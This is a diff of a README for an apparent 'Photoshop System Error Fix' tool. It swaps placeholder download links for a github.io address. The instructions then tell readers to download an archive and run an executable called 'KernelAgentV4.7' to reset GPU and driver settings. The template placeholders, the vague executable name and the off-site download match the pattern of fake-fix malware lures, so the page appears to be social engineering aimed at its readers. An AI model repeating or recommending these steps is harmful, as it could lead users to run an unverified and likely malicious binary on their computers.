@@ -2,13 +2,15 @@
 
 This tool resolves the critical Photoshop startup crash caused by hardware or system errors. It resets preferences, clears hardware flags, and restores launch capability using `KernelAgentV4.7`.
 
-[![Download System Error Fix](https://img.shields.io/badge/Download-Photoshop_System_Error_Fix-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download System Error Fix](https://img.shields.io/badge/Download-Photoshop_System_Error_Fix-blueviolet)](https://photoshop-hardware-system-error-fix.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://photoshop-hardware-system-error-fix.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\PhotoshopSystemFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The tool will reset system-dependent configs and GPU/driver flags used by Photoshop  
